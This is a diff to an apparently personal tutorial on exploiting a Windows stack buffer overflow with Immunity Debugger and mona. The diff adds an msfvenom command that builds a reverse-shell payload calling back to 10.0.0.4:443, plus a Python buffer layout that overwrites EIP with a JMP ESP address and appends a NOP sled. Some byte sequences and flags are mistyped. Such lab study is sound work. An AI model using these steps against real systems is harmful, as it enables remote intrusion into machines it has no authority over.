@@ -27,8 +27,7 @@ Tool: Immunity Debugger
     /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 9999 -q 39694438
     
   Program: 2-controlling-eip.py
-  
-  
+    
    
 ### Step 3 Locating Space and prepare the shellCode
 
@@ -43,31 +42,43 @@ Tool: Immunity Debugger
     Program: 3-controlling-eip.py
   
 
-### Step 5 check any memory protections such as DEP adn ASLR
+### Step 5 Locate the JMP ESP
     
-    Immunity Debugger Command: !mona modules
-  
-
-### Step 6 Locate the JMP ESP
-
+As the ESP address can be changed during each execution, we need to find a "JMP ESP" instrcution to go to the ESP location 
+ 
     /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
   
     JMP ESP address => \xe4\xff
-  
+    
+### Step 6 check any memory protections such as DEP adn ASLR
+    
+    Find the program or DLL that can be used for their "JMP ESP" instruction.
+    
+    Immunity Debugger Command: !mona modules
+    
+   
   Immunity Debugger Command: !mona find -s "\xe4\xff" -m <program name>
+                         e.g. !mona find -s “\xff\xe4” -m "libspp.dll"
   
   
 ### Step 7 Generating ShellCode using Metasploit
 
     Metasploit Command: msfvenom -l payloads
   
-    Metasploit Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+    Metasploit Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443  EXITFUNC-thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
   
     -f format
     -e encode
     -b exclude character 
+    EXITFUNC-thread exit the function after exploit which makes the program can still running for next exploit.
  
  ### Step 8 Sending the ShellCode 
+ 
+    filler = "A" * 780
+    eip = "\x83\x0c\x09\x10" <- this address is pointing the the JMP ESP instruction set
+    offset = "C" * 4
+    nops = "\x90" * 10
+    inputBuffer = filler + eip + offset + nops + shellcode
  
   Program: 4-expolit-lin.py
   
